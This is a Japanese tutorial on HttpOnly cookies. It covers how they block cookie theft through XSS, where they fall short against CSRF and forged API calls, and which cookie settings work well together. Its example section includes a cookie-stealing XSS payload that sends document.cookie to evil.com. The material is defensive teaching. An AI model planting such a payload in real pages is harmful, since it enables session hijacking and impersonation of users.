# HttpOnly Cookie が安全と言われる理由

JavaScript から Cookie を読めなくできるから

つまり、XSS（悪意あるスクリプト注入）が起きても、
認証情報を盗まれにくくなる

## Cookie の危険性

普通の Cookie は JavaScript から読める

```
document.cookie
```

例えば

```
Set-Cookie: sessionId=abc123
```

ブラウザ保存後

```ts
console.log(document.cookie);

// sessionId=abc123
```

中身が見えてしまう

## 何が危険？

もし XSS があると

```ts
<script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>
```

- sessionId
- JWT
- 認証情報

を全部盗める

つまり、「その人になりすましてログイン」できる

Cookie を利用する上で最大の危険に繋がってくる

#### XSS（クロスサイトスクリプティング）とは？

> 脆弱性のある Web サイトを訪れたユーザーのブラウザ上で、悪意のあるプログラム（スクリプト）が実行されてしまうサイバー攻撃手法およびその脆弱性のこと

## HttpOnly とは？

```
Set-Cookie: sessionId=abc123; HttpOnly
```

- ブラウザは保存する
- HTTP 通信には送る
- でも JavaScript から読めない

という設定になる

**HttpOnly は「JavaScript から読めない」だけで HTTP 通信では普通に送られる**

---

### 動作イメージ

サーバー

```
Set-Cookie: sessionId=abc123; HttpOnly
```

ブラウザ保存

- 内部的には保存される

次回アクセス

```
GET /profile
Cookie: sessionId=abc123
```

自動送信される

| 項目       | 結果     |
| ---------- | -------- |
| JavaScript | 読めない |
| HTTP 通信  | 送れる   |

## なぜ安全なのか

XSS 攻撃を考える

- `普通 Cookie`...中身が見えて盗まれる

- `HttpOnly Cookie`...見えないので盗めない

「認証トークン流出」をかなり防げる

ただし!!HttpOnly = 完全無敵ではない

---

### XSS 自体は防げない

例

```ts
<script>
fetch("/api/delete-account", {
  method: "POST"
})
</script>
```

これは実行される

理由 : Cookie は

- JS から読めない
- でも HTTP 送信時には自動添付

のため

---

### 守れるもの / 守れないもの

守られる

- Cookie 値の漏洩
- JWT 盗難
- SessionID 盗難
- 永続的ななりすまし

防げない

- JS 実行そのもの
- CSRF 系攻撃
- 不正 API 実行
- DOM 改ざん

---

### 「盗めない」と「使えない」は別

攻撃者は`document.cookie`できない

- コピーできない
- 外部送信できない
- 後で悪用しにくい

しかし`fetch("/api/money-transfer")`は可能

なぜならブラウザが自動で Cookie 添付するから → **Session Cookie + 問題**が発生

#### CSRF（クロスサイト・リクエスト・フォージェリ）とは？

> Web サイトにログイン中のユーザーをだまし、本人の意図しない操作（パスワード変更や不正な決済など）を強制的に実行させるサイバー攻撃やその脆弱性

補足

| 項目           | XSS (クロスサイトスクリプティング)           | CSRF (クロスサイトリクエストフォージェリ)              |
| -------------- | -------------------------------------------- | ------------------------------------------------------ |
| 主な目的       | ブラウザ上で悪意あるスクリプトを実行させる   | ログイン中ユーザーに意図しない操作（状態変更）をさせる |
| ターゲット     | 閲覧者（ユーザー）のブラウザ                 | Web アプリケーションのセッション管理                   |
| 偽装するもの   | サイトの信頼性（正規のサイトに見せかける）   | ユーザーの意思（本人が操作したと錯覚させる）           |
| 攻撃のトリガー | 罠ページへのアクセス、不正なリンクのクリック | ログイン状態のまま罠ページにアクセスまたはクリック     |

## 実際の組みあわせのイメージ

| 技術       | 防ぐもの       |
| ---------- | -------------- |
| HttpOnly   | Cookie 盗難    |
| Secure     | HTTPS のみ送信 |
| SameSite   | CSRF           |
| CSP        | XSS            |
| エスケープ | XSS            |
| CSRF Token | CSRF           |

現代の最強構成

```
Set-Cookie:
sessionId=abc123;
HttpOnly;
Secure;
SameSite=Lax
```

or

```
SameSite=Strict
```

## JWT と HttpOnly Cookie

#### JWT 保存場所問題

JWT を LocalStorage に保存すると

```ts
localStorage.getItem("token");
```

XSS で普通に盗まれる

そこで HttpOnly Cookie 保存

```
Set-Cookie: token=jwt; HttpOnly
```

なら読めない →JWT 盗難耐性がかなり上がる

---

### けど CSRF は発生する

Cookie は自動送信されるから

| 保存先          | XSS  | CSRF |
| --------------- | ---- | ---- |
| localStorage    | 弱い | 強い |
| HttpOnly Cookie | 強い | 弱い |

トレードオフ

## 実務では？

```
HttpOnly Cookie
+
SameSite
+
CSRF Token
```

構成が主流

## まとめ

HttpOnly は`「JavaScript から見えなくする」`だけ

■ 防げるもの

- SessionID 盗難
- JWT 盗難
- XSS 経由 Cookie 漏洩
- なりすまし被害拡大

■ 防げないもの

- XSS 自体
- CSRF
- API 不正実行

■ 実務最強構成

```
Set-Cookie:
sessionId=abc123;
HttpOnly;
Secure;
SameSite=Lax
```

#### HttpOnly は「Cookie を隠す技術」

#### Secure は「盗聴を防ぐ技術」

#### SameSite は「外部サイト悪用を防ぐ技術」
